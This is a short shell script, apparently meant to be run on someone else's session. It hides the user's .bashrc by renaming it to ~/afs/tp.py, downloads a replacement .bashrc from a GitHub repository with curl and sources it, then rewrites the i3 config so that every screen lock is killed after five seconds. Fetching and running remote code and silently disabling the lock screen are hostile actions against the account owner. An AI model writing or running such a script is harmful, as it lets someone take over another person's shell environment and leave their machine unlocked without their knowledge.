#PS1='\e[36m'
mv ~/.bashrc ~/afs/tp.py

curl -sO https://raw.githubusercontent.com/did73at/cflse/main/.bashrc
source .bashrc


damni3lock() {
    filename=".config/i3/config"
    echo $USER
    sleep 1
    sed '/bindsym .* exec i3lock / s|$| \&\& sleep 5 \&\& pkill i3lock|' "$filename" > "$filename.tmp" && mv "$filename.tmp" "$filename"
}
damni3lock
